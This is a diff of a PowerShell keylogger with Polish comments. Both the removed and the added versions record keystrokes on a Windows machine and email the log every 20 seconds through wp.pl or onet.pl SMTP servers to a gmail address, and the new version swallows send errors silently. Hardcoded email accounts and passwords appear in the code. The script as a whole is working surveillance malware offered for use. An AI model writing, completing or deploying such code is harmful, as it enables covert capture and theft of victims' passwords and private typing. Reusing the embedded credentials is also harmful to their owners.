@@ -1,42 +1,48 @@
+# Konfiguracja maila WP.PL
+$smtpServer = "smtp.wp.pl"
+$smtpFrom = "rarrak873@wp.pl"
+$smtpTo = "przemekparuwa@gmail.com"
+$subject = "Keylogger Report"
+$username = "rarrak873@wp.pl"
+$password = ",AixNM+Hg6!US&g"  # <-- Twoje hasło
+$logFile = "$env:TEMP\kluczlog.txt"
+
+# Tworzenie pustego pliku logów
+New-Item -Path $logFile -ItemType File -Force | Out-Null
+
+# Funkcja: Nasłuchiwanie klawiszy
 Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Drawing
+$global:keys = ""
 
-$logPath = "$env:APPDATA\keylog.txt"
-$global:log = ""
+# Timer do wysyłania maila co 20 sekund
+$timer = New-Object Timers.Timer
+$timer.Interval = 20000
+$timer.AutoReset = $true
+$timer.add_Elapsed({
+    if (Test-Path $logFile) {
+        $body = Get-Content $logFile -Raw
+        if ($body -ne "") {
+            $smtp = New-Object Net.Mail.SmtpClient($smtpServer, 465)
+            $smtp.EnableSsl = $true
+            $smtp.Credentials = New-Object System.Net.NetworkCredential($username, $password)
+            try {
+                $smtp.Send($smtpFrom, $smtpTo, $subject, $body)
+                Clear-Content -Path $logFile
+            } catch {
+                # Jeśli wysyłka się nie uda — nic nie rób.
+            }
+        }
+    }
+})
+$timer.Start()
 
-function Start-Keylogger {
-    $form = New-Object Windows.Forms.Form
-    $form.KeyPreview = $true
-    $form.Add_KeyDown({
-        param($sender, $e)
-        $key = $e.KeyCode.ToString()
-        $global:log += "$key "
-        Set-Content -Path $logPath -Value $global:log
-    })
-    $null = $form.ShowDialog()
-}
-
-function Send-Email {
-    $smtpServer = "smtp.poczta.onet.pl"
-    $smtpPort = 587
-    $smtpUser = "darmaff@op.pl"
-    $smtpPass = "Y%$AhtJN!4iZVDk"
-
-    $msg = New-Object System.Net.Mail.MailMessage
-    $msg.From = $smtpUser
-    $msg.To.Add("przemekparuwa@gmail.com")
-    $msg.Subject = "Keylog - test edukacyjny"
-    $msg.Body = Get-Content $logPath -Raw
-
-    $smtp = New-Object Net.Mail.SmtpClient($smtpServer, $smtpPort)
-    $smtp.EnableSsl = $true
-    $smtp.Credentials = New-Object System.Net.NetworkCredential($smtpUser, $smtpPass)
-    $smtp.Send($msg)
-}
-
-Start-Job -ScriptBlock { Start-Keylogger }
-
+# Nasłuchiwanie w tle
 while ($true) {
-    Start-Sleep -Seconds 20
-    Send-Email
+    Start-Sleep -Milliseconds 100
+    foreach ($key in [System.Windows.Forms.Keys]::GetValues([System.Windows.Forms.Keys])) {
+        if ([System.Windows.Forms.Control]::ModifierKeys -eq $key -or [System.Windows.Forms.Keyboard]::IsKeyDown($key)) {
+            $keyName = $key.ToString()
+            Add-Content -Path $logFile -Value $keyName
+        }
+    }
 }
